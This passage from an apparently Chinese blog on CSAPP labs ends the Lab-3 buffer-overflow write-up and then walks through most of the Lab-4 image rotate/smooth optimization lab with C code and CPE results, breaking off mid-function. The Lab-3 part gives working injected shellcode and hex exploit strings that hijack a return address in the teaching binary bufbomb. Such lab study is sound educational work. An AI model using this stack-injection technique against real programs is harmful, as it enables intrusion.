 8049062:	c7 04 24 03 00 00 00 	movl   $0x3,(%esp)
 8049069:	e8 72 fa ff ff       	call   8048ae0 &lt;validate&gt;
 804906e:	c9                   	leave  
 804906f:	c3                   	ret 
</code></pre>
<p>代码观察：</p>
<ul>
<li>地址 <code>8049006</code>：观察到，<code>$0xdeadbeef</code> 存储在 <code>-0x4(%ebp)</code>，此时对应的 <code>%ebp</code> 为: <code>0xffffba78</code>，也就是 <code>$0xdeadbeef</code> 存储在 <code>0xffffba74</code>。</li>
<li>地址 <code>804901e</code>：<code>%edx</code> 存储 <code>getbuf</code> 返回值</li>
<li>地址 <code>8049020</code> 到 <code>8049028</code>：将 <code>-0x4(%ebp)</code> 取出来和 <code>$0xdeadbeef</code> 比较。</li>
<li>地址 <code>8049038</code> 到 <code>804903e</code>：比较 <code>getbuf</code> 返回值和 cookie 是否相等</li>
</ul>
<p>我们都知道函数执行结果一般放在 <code>%eax</code>，<code>getbuf</code> 函数也是一样，我们注入的指令，应该要修改 <code>%eax</code> 为我们的 cookie，在 <code>getbuf</code> 压入 test 函数调用时正常返回的位置 <code>0x804901e</code>。在返回到 test 时会使用 <code>%ebp</code>，我们的注入代码不应该动这个值。</p>
<h3>方案 1：覆盖正确的 <code>%ebp</code></h3>
<p>编写的 <code>level3.s</code> 为：</p>
<pre><code>movl $0x2ac98515,%eax
movl $0x804901e,(%rsp)
ret
</code></pre>
<p>得到的反汇编文件：</p>
<pre><code class="language-d">level3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:	b8 15 85 c9 2a       	mov    $0x2ac98515,%eax
   5:	c7 04 24 1e 90 04 08 	movl   $0x804901e,(%rsp)
   c:	c3                   	retq   

</code></pre>
<p>编写指令做两件事：</p>
<ol>
<li>修改 <code>getbuf</code> 的返回值</li>
<li>跳转到 <code>test</code> 正确的位置</li>
</ol>
<p>答案：</p>
<pre><code># 答案 1 
41 42 43 44 45 46 47 48 49 4a 4b 4c 🔹78 ba ff ff🔹 ❤60 ba ff ff❤ ☢b8 15 85 c9 2a c7 04 24 1e 90 04 08 c3☢
</code></pre>
<p>❤标记了指令执行地址，☢标记了注入的指令，🔹标记了覆盖的 <code>%ebp</code>：<code>0xffffba78</code></p>
<h2>方案 2：指令修改为正确的 <code>%ebp</code></h2>
<p>另外一种答案为在指令中修改正确的 <code>%ebp</code> 的值也是可以的，两者实现的效果是一样的。</p>
<p>编写的 <code>level3.s</code> 为：</p>
<pre><code class="language-d">movl $0x2ac98515,%eax
movl $0x804901e,(%rsp)
movl $0xffffba78,%ebp
ret
</code></pre>
<p>反汇编结果：</p>
<pre><code class="language-d">
level3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &lt;.text&gt;:
   0:	b8 15 85 c9 2a       	mov    $0x2ac98515,%eax
   5:	c7 04 24 1e 90 04 08 	movl   $0x804901e,(%rsp)
   c:	bd 78 ba ff ff       	mov    $0xffffba78,%ebp
  11:	c3                   	retq   

</code></pre>
<p>答案文件 <code>exploit3.txt</code> 为：</p>
<pre><code># 答案 2 。其中 zz zz zz zz 为任意十六进制数
41 42 43 44 45 46 47 48 49 4a 4b 4c 🔹zz zz zz zz🔹 ❤60 ba ff ff❤ ☢b8 15 85 c9 2a c7 04 24 1e 90 04 08 ◾bd 78 ba ff ff◾ c3☢
</code></pre>
<p>◾标记了新增的指令。</p>
<p>最终 <code>bufbomb</code> 程序结果为：</p>
<pre><code>Type string:Boom!: getbuf returned 0x2ac98515
</code></pre>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/yasi_xi/article/details/9263955">gdb中看内存(x命令)_gdb 查看内存x-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/a523442148/article/details/101253155">修改程序堆栈的可执行属性-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/629686088">CSAPP课程Lab3 attack - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>
<p>GDB 的使用详见：<a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a>。这里新学一个命令：<code>examine</code> 查看内存地址中的值（简写为 <code>x</code>）。<code>x</code> 命令的语法如下所示：</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="165066519" class="record">
            <header>
                <h1 class="record-title">CSAPP LAB-4 代码优化</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CSAPP');">CSAPP</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/3/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240603130349.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>烧脑的循环展开</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>9d6b717</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>
<h1>实验介绍</h1>
<p>图像处理中存在很多函数，可以对这些函数进行优化。本实验主要关注两种图像处理操作：</p>
<ul>
<li>旋转：对图像逆时针旋转 90 度</li>
<li>平滑：对图像进行模糊操作</li>
</ul>
<p>图像用二维矩阵 M 表示，$M_{ij}$ 表示图像 M 的第 $(i,j)$ 像素的值，像素值用红，绿，蓝表示。</p>
<p>旋转操作用下面 2 个操作表示：</p>
<ul>
<li>Transpose：对第（i,j）个像素对，$M_{ij}$ 和 $M_{ji}$ 交换</li>
<li>Exchange rows：行 i 和行 <code>N-1-i</code> 交换</li>
</ul>
<p>平滑操作：每个像素用周围像素值的平均值表示（相当于进行均值滤波）。比如：</p>
<p>$$<br>
\begin{aligned}<br>
M_2[1][1] = &amp; \frac{\sum_{i=0}^2 \sum_{j=0}^2 M_1[i][j]}{9} \<br>
M_2[N-1][N-1] = &amp; \frac{\sum_{i=N-2}^{N-1} \sum_{j=N-2}^{N-1} M_1[i][j]}{4}<br>
\end{aligned}</p>
<p>$$</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240603130915.webp" alt="image.png"></p>
<p>编码规则：</p>
<ul>
<li>只能用 ANSI C，不能用嵌入式汇编</li>
<li>不能修改测量时间的机制（CPE）</li>
<li>只能修改 <code>kernels.c</code>，可以定义宏，全局变量，函数</li>
</ul>
<h1>实验开始</h1>
<h2>知识回顾</h2>
<p>回顾一下 CSAPP 第 5 第 6 章学到了哪些优化代码的小技巧：</p>
<ul>
<li>消除冗余的函数调用。比如避免在 for 循环里用 strlen。</li>
<li>消除不必要的内存引用。比如引入临时变量来把中间结果保存到寄存器里，在全部计算完成后把最终结果存到数组或全局变量里。</li>
<li>循环展开，降低判断语句和增减循环变量的开销。</li>
<li>累积变量和重新组合，提高指令并行性。</li>
<li>功能性风格重写条件操作，即用三元运算符。</li>
<li>提高空间局部性，尽量按照数组在内存里存储的顺序，以 1 为步长进行读取。</li>
<li>提高时间局部性，一旦在内存里读出一个变量，就尽可能频繁且集中的使用它。</li>
</ul>
<p>Cache 的理论依据：</p>
<ul>
<li>时间局部性：如果程序中的某条指令一旦执行，不久以后该指令可能再次执行；如果某数据被访问过，不久以后该数据可能再次被访问。也就是说：被引用过一次的存储器位置在未来会被多次引用，比如循环操作。</li>
<li>空间局部性：一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问。也就是说：如果一个存储器的位置被引用，那么将来他附近的位置也会被引用，比如 cache。</li>
<li>Cache 有读命中和写命中，写不命中开销比读不命中大。因为在计算机缓存机制中，写操作通常比读操作更为复杂和成本较高。</li>
</ul>
<h2>准备工作</h2>
<p>解压作业包：<code>tar xvf perflab-handout.tar</code>。</p>
<p>只能允许修改 <code>kernels.c</code> 文件。我们首先在 <code>kernels.c</code> 填上自己的信息，程序才能成功启动：</p>
<pre><code class="language-c">/*
 * Please fill in the following team struct
 */
team_t team = {
    &quot;casa&quot;, /* Team name */

    &quot;&quot;,                /* First member full name */
    &quot;&quot;, /* First member email address */

    &quot;&quot;, /* Second member full name (leave blank if none) */
    &quot;&quot;  /* Second member email addr (leave blank if none) */
};
</code></pre>
<p>测试和运行：</p>
<pre><code class="language-sh">make driver
./driver
</code></pre>
<p>得到的其中一条示例结果为：</p>
<pre><code>Smooth: Version = naive_smooth: Naive baseline implementation:
Dim             32      64      128     256     512     Mean
Your CPEs       27.0    28.0    26.3    29.2    24.1
Baseline CPEs   695.0   698.0   702.0   717.0   722.0
Speedup         25.7    25.0    26.6    24.6    29.9    26.3
</code></pre>
<blockquote>
<p>有时候运行会抽风，计算的 CPE 出现负数。并且提示：Fatal Error: Non-positive CPE value... 这时候重新运行一遍就行。另外每次运行 <code>driver</code> 得到的分数都会不一样。</p>
</blockquote>
<p>第一行表示执行的方法与函数信息，我们的目标让自己的函数的 Your CPEs 尽可能低，让 Speedup 的 Mean（平均值）比使用默认方法要高。</p>
<blockquote>
<p>CPE or Cycles per Element。如果一个函数使用 C 个周期去执行一个大小为 N*N 的图像，那么 CPE=C/(N*N),因此 CPE 越小越好。</p>
</blockquote>
<p>在 <code>kernel.c</code> 中有 rotate 的实现方法，我们需要添加自己的 rotate 实现，函数名自己命名，然后通过以下方式注册函数：</p>
<pre><code class="language-c">void register_rotate_functions() { 
	add_rotate_function(&amp;rotate, rotate_descr); 
	add_rotate_function(&amp;my_rotate，my_rotate_descr);
} 
</code></pre>
<p>每个像素的结构：</p>
<pre><code class="language-c">typedef struct { 
	unsigned short red; /* R value */ 
	unsigned short green; /* G value */ 
	unsigned short blue; /* B value */ 
} pixel
</code></pre>
<p>图像用一维数组表示，第（i,j）个像素表示为 <code>I[RIDX(i,j,n)]</code>，n 为图像的维数。</p>
<pre><code class="language-c">#define RIDX(i,j,n) ((i)*(n)+(j))
</code></pre>
<h2>图像旋转</h2>
<p>原函数的实现为：</p>
<pre><code class="language-c">void naive_rotate(int dim, pixel *src, pixel *dst)
{
    int i, j;

    for (i = 0; i &lt; dim; i++)
        for (j = 0; j &lt; dim; j++)
            dst[RIDX(dim - 1 - j, i, dim)] = src[RIDX(i, j, dim)];
}
</code></pre>
<h3>减少写数据的迭代步长</h3>
<p>利用知识点：写不命中开销比读不命中大。我们应该优先对写入像素点的索引进行优化。</p>
<p>观察原函数得知，dst 在进行写时，单次迭代的步长很大。以下是针对这点进行改进的三个版本，它们都比原始方法的性能更好。</p>
<pre><code class="language-c">/*
	单纯交换两个for循环的i和j
*/
char rotateij_rev_descr[] = &quot;rotate:  单纯 i,j 调换(遍历顺序调换)&quot;;
void rotateij_rev(int dim, pixel *src, pixel *dst)
{
    int i, j;

    for (j = 0; j &lt; dim; j++)
        for (i = 0; i &lt; dim; i++)
            dst[RIDX(dim - 1 - j, i, dim)] = src[RIDX(i, j, dim)];
}


/*
	改写取dst索引的方式，按顺序写入dst。
	索引的推导方法可以通过自己手动模拟，写出src对应的索引式子：jn+n-1-i = (j+1)n-1-i
*/
char rotateij_descr[] = &quot;rotate:  单纯 i,j 调换&quot;;
void rotateij(int dim, pixel *src, pixel *dst)
{
    int i, j;

    for (i = 0; i &lt; dim; i++)
        for (j = 0; j &lt; dim; j++)
            dst[RIDX(i, j, dim)] = src[RIDX(j+1, -1-i, dim)];
}

/*
	在rotateij的基础上把索引变量提取出来，尽量不使用乘法。使用指针代替RIDX进行数组访问。
*/
char rotateij_local_descr[] = &quot;rotate: i,j 调换 + 使用局部变量 &quot;;
void rotateij_local(int dim, pixel *src, pixel *dst)
{
    int i, j;
    int didx = 0;
    int osidx = RIDX(1, -1, dim);
    int sidx = osidx--;
    for (i = 0; i &lt; dim; i++)
    {
        for (j = 0; j &lt; dim; j++)
        {
            dst[didx++] = src[sidx];
            sidx += dim;
        }
        sidx = osidx--;
    }
}
</code></pre>
<p>结果如下：</p>
<pre><code>Rotate: Version = rotate:  单纯 i,j 调换(遍历顺序调换):
Dim             64      128     256     512     1024    Mean
Your CPEs       1.0     1.1     2.0     2.3     5.8
Baseline CPEs   14.7    40.1    46.4    65.9    94.5
Speedup         14.3    35.2    23.3    28.6    16.4    22.3

Rotate: Version = rotate:  单纯 i,j 调换:
Dim             64      128     256     512     1024    Mean
Your CPEs       1.3     1.2     1.9     2.6     5.8
Baseline CPEs   14.7    40.1    46.4    65.9    94.5
Speedup         11.2    32.1    24.3    25.1    16.2    20.4

Rotate: Version = rotate: i,j 调换 + 使用局部变量 :
Dim             64      128     256     512     1024    Mean
Your CPEs       1.3     1.2     1.8     2.5     5.6
Baseline CPEs   14.7    40.1    46.4    65.9    94.5
Speedup         11.3    32.9    25.6    26.4    16.9    21.2
</code></pre>
<p>观察可知 <code>rotateij_rev</code> 效果更好。由于历史原因（由于我懒得改代码了），我这里使用了 <code>rotateij_local</code> 方法。读者可随意选取方法，不影响后续的改进。</p>
<h3>矩阵分块计算</h3>
<p>观察到测试的图像长宽都是 16 或 32 的倍数。我们可以考虑矩阵分块。</p>
<p>矩阵分块可以减少缓存的不命中率。空间局部性更好。这里测试了 32*32 分块和 16*16 分块代码。</p>
<pre><code class="language-c">char rotate_blc32_descr[] = &quot;rotate: 32 大小的块&quot;;
void rotate_blc32(int dim, pixel *src, pixel *dst)
{
    // naive_rotate(dim, src, dst);
    int i, j, I, J;
    int block_size = 32;
    for (I = 0; I &lt; dim; I += block_size)
    {
        for (J = 0; J &lt; dim; J += block_size)
        {
            for (i = 0; i &lt; block_size; i++)
            {
                for (j = 0; j &lt; block_size; j++)
                {
                    dst[RIDX(i + I, j + J, dim)] = src[RIDX(J + j + 1, -1 - i - I, dim)];
                }
            }
        }
    }
}

char rotate_blc16_descr[] = &quot;rotate: 16 大小的块&quot;;
void rotate_blc16(int dim, pixel *src, pixel *dst)
{
    // naive_rotate(dim, src, dst);
    int i, j, I, J;
    int block_size = 16;
    for (I = 0; I &lt; dim; I += block_size)
    {
        for (J = 0; J &lt; dim; J += block_size)
        {
            for (i = 0; i &lt; block_size; i++)
            {
                for (j = 0; j &lt; block_size; j++)
                {
                    dst[RIDX(i + I, j + J, dim)] = src[RIDX(J + j + 1, -1 - i - I, dim)];
                }
            }
        }
    }
}
</code></pre>
<p>多次测试表明按 16*16 分块效果会好一点。</p>
<pre><code>Rotate: Version = rotate: 32 大小的块:
Dim             64      128     256     512     1024    Mean
Your CPEs       1.6     1.4     1.5     1.7     2.5
Baseline CPEs   14.7    40.1    46.4    65.9    94.5
Speedup         9.0     28.1    31.4    38.6    37.5    25.8

Rotate: Version = rotate: 16 大小的块:
Dim             64      128     256     512     1024    Mean
Your CPEs       1.4     1.5     1.4     1.8     2.5
Baseline CPEs   14.7    40.1    46.4    65.9    94.5
Speedup         10.2    27.5    32.7    36.0    38.0    26.3
</code></pre>
<p>关于矩阵分块的具体原理推荐阅读：</p>
<ul>
<li><a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">waside-blocking.pdf (cmu.edu)</a></li>
<li><a href="https://www.bilibili.com/read/cv24735613/">CSAPP LAB之cachelab，缓存、命中率、矩阵处理 - 哔哩哔哩 (bilibili.com)</a></li>
</ul>
<h3>循环展开</h3>
<p>循环展开是一种牺牲程序的尺寸来加快程序的执行速度的优化方法。可以由程序员完成，也可由编译器自动优化完成。循环展开的本质是，利用 CPU 指令级并行，来降低循环的开销，当然，同时也有利于指令流水线的高效调度。</p>
<p>优点：</p>
<ul>
<li>提高缓存命中（cache hit）率，增加循环体内语句并发执行的可能性（需要循环体内语句不相关）；</li>
<li>减少分支预测失败的可能性，提高性能</li>
</ul>
<p>缺点：</p>
<ul>
<li>程序代码膨胀、代码可读性降低</li>
<li>消耗较多寄存器缓存</li>
</ul>
<p>在分块的基础上进行循环展开：</p>
<pre><code class="language-c">char rotate_blc16_16_descr[] = &quot;rotate: 16 块 16*1 循环展开&quot;;
void rotate_blc16_16(int dim, pixel *src, pixel *dst)
{
    int i, I, J;
    int block_size = 16;
    int didx, sidx;
    for (I = 0; I &lt; dim; I += block_size)
    {
        for (J = 0; J &lt; dim; J += block_size)
        {
            for (i = 0; i &lt; block_size; i++)
            {
                didx = RIDX(i + I, J, dim);
                sidx = RIDX(J + 1, -1 - i - I, dim);
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
                dst[didx++] = src[sidx];
                sidx += dim;
            }
        }
    }
}
</code></pre>
<pre><code>Rotate: Version = rotate: 16 块 16*1 循环展开:
Dim             64      128     256     512     1024    Mean
Your CPEs       1.2     1.2     1.3     1.5     2.3
Baseline CPEs   14.7    40.1    46.4    65.9    94.5
Speedup         12.4    33.8    34.6    45.3    40.4    30.5
</code></pre>
<h2>平滑操作</h2>
<p>原函数存在的问题是频繁的调用 <code>avg</code> 函数、<code>min</code>、<code>max</code> 等各种函数开销较大。</p>
<p>我们可以考虑循环展开或者消除函数调用，进一步，可以将重复利用的数据存储在了数组之中。</p>
<p>思路：</p>
<ul>
<li>不使用其他任何函数，自己实现平滑计算</li>
<li>对四个点、四条边和中间内容分别处理</li>
<li>充分利用统计先前的统计结果统计像素值的总和</li>
</ul>
<p><code>temp_pixel_group</code> 用于统计列的像素之和。为了便于迭代操作和空间利用，<code>temp_pixel_group</code> 安排方式为：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240603155715.webp" alt="image.png"></p>
<blockquote>
<p>循环展开后的代码看着眼花，调试 Bug 更是折磨人。</p>
</blockquote>
<pre><code class="language-c">// 定义自己的数据结构。注意成员的类型是int类型。
typedef struct
{
    int red;
    int green;
    int blue;
} my_pixel_sum;

char smooth_my_descr[] = &quot;smooth: 我的实现版本&quot;;
void smooth_my(int dim, pixel *src, pixel *dst){
    int i, j;

    // 四点处理
    int q1, q2, q3, q4, idx;
    q1 = 0;
    q2 = 1;
    q3 = dim;
    q4 = dim + 1;
    idx = 0;
    dst[idx].blue = (src[q1].blue + src[q2].blue + src[q3].blue + src[q4].blue) / 4;
    dst[idx].green = (src[q1].green + src[q2].green + src[q3].green + src[q4].green) / 4;
    dst[idx].red = (src[q1].red + src[q2].red + src[q3].red + src[q4].red) / 4;

    q1 = dim - 2;
    q2 = dim - 1;
    q3 = dim + dim - 2;
    q4 = dim + dim - 1;
    idx = dim - 1;
    dst[idx].blue = (src[q1].blue + src[q2].blue + src[q3].blue + src[q4].blue) / 4;
    dst[idx].green = (src[q1].green + src[q2].green + src[q3].green + src[q4].green) / 4;
    dst[idx].red = (src[q1].red + src[q2].red + src[q3].red + src[q4].red) / 4;

    q1 = (dim - 2) * dim;
    q2 = (dim - 2) * dim + 1;
    q3 = (dim - 1) * dim;
    q4 = (dim - 1) * dim + 1;
    idx = (dim - 1) * dim;
    dst[idx].blue = (src[q1].blue + src[q2].blue + src[q3].blue + src[q4].blue) / 4;
    dst[idx].green = (src[q1].green + src[q2].green + src[q3].green + src[q4].green) / 4;
    dst[idx].red = (src[q1].red + src[q2].red + src[q3].red + src[q4].red) / 4;

    q1 = dim * dim - 2 - dim;
    q2 = dim * dim - 1 - dim;
    q3 = dim * dim - 2;
    q4 = dim * dim - 1;
    idx = dim * dim - 1;
    dst[idx].blue = (src[q1].blue + src[q2].blue + src[q3].blue + src[q4].blue) / 4;
    dst[idx].green = (src[q1].green + src[q2].green + src[q3].green + src[q4].green) / 4;
    dst[idx].red = (src[q1].red + src[q2].red + src[q3].red + src[q4].red) / 4;

    my_pixel_sum *temp_pixel_group = (my_pixel_sum *)malloc(sizeof(my_pixel_sum) * 3);

    // 上边处理
    // 初始化temp_pixel_group
    for (i = 0; i &lt;= 1; i++)
    {
        temp_pixel_group[i].blue = src[RIDX(0, i, dim)].blue + src[RIDX(1, i, dim)].blue;
        temp_pixel_group[i].green = src[RIDX(0, i, dim)].green + src[RIDX(1, i, dim)].green;
        temp_pixel_group[i].red = src[RIDX(0, i, dim)].red + src[RIDX(1, i, dim)].red;
    }
    for (j = 1; j &lt;= dim - 2; j++)
    {
        q1 = j + 1;
        temp_pixel_group[q1 % 3].blue = src[RIDX(0, q1, dim)].blue + src[RIDX(1, q1, dim)].blue;
